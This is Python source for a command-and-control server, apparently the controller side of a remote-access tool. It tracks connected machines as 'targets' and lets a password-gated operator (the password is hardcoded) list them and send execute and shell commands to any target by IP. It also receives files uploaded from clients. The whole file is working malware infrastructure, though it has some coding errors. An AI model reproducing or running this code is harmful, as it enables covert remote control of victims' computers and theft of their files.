import socket
import threading
import re
import time

class Server:
	def __init__(self, SERVER_IP: str, SERVER_PORT: int, SUPER_PASSWORD: str, output_directory="files") -> None:
		self.SERVER_IP = SERVER_IP
		self.SERVER_PORT = SERVER_PORT
		self.SUPER_PASSWORD = SUPER_PASSWORD
		self.output_directory = output_directory
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.bind((SERVER_IP, SERVER_PORT))
		self.targets_list = {}


	def ftp(self, conn: socket.socket, addr: list[str, int], req: str) -> None:
		file_bytes = b''
		name = req.split("|")[0]
		print(f"Start download file {name}")

		while True:
			msg = conn.recv(1024)
			try:
				if "END" == msg.decode("utf-8"):
					conn.close()
					break
			except:
				pass
			file_bytes += msg

		with open(f"files/{name}", "wb") as file:
			file.write(file_bytes)
		print(f"[{self.SERVER_IP}:{self.SERVER_PORT}]$ Saved file in directory: {self.output_directory}+"/"+{name}")
	

	def super_client(self, conn: socket.socket, addr: list[str, int]) -> None:
		print(f"{addr[0]}:{addr[1]}", "super user was connected")
		while True:		
			try:
				command = conn.recv(1024)
				content = command.decode()
				content_splited = content.split(" ")

			except:
				print(f"{addr[0]}:{addr[1]}", "super user was disconnected")
				break
			
			if content_splited[0] == "all_clients":
				conn.send(bytes(f"{self.targets_list}", "utf-8"))

			elif content_splited[0] == "exec" and len(content_splited) > 2:
				cut = len(content_splited[0])+len(content_splited[1])+2
				self.exec_on_client(content_splited[1], content[cut:])
				conn.send(bytes(" ", "utf-8"))
			
			elif content_splited[0] == "cmd" and len(content_splited) > 2:
				cut = len(content_splited[0])+len(content_splited[1])+2
				self.cmd_on_client(conn, content_splited[1], content[cut:])
				conn.send(bytes(" ", "utf-8"))

			else:
				conn.send(bytes(f"unknow command: {command.decode()}", "utf-8"))
		

	def target(self, conn: socket.socket, addr: list[str, int]) -> None:
		while True:
			try:
				req = conn.recv(1024)
				content = req.decode()
				if content.startswith(self.SUPER_PASSWORD):
					self.super_client(conn, addr)
					break
				else:
					conn.send(b'0')
					self.targets_list[addr[0]] = [conn, time.strftime("%d.%m.%Y/%H.%M.%S")]

			except:
				print(f"{addr[0]}:{addr[1]}", "was disconnected")
				break
			# if content.startswith("FILE"):
			# 	self.tcp(conn, addr, req)
			# 	break
			

	def exec_on_client(self, ip, message):
		self.targets_list[ip][0].send(bytes(f"EXEC|{message}", encoding="utf-8"))
	
	def cmd_on_client(self, conn, ip, message):
		self.targets_list[ip][0].send(bytes(f"CMD|{message}", encoding="utf-8"))
		ret = conn.recv(1024)
		conn.send(bytes(ret, encoding="utf-8"))

	def start(self):
		print(f"[{self.SERVER_IP}:{self.SERVER_PORT}]$ Server was started")
		while True:
			self.s.listen(100)
			
			conn, addr = self.s.accept()

			print(f"{addr[0]}:{addr[1]}", "was connected")
			target_name = f"{addr[0]}:{addr[1]}"
			threading.Thread(target=self.target, name=target_name, args=(conn, addr)).start()


if __name__ == "__main__":
	SERVER_HOST = "0.0.0.0"
	SERVER_PORT = 7546
	SUPER_PASSWORD = "jesus_134"
	server = Server(SERVER_HOST, SERVER_PORT, SUPER_PASSWORD)	
	server.start()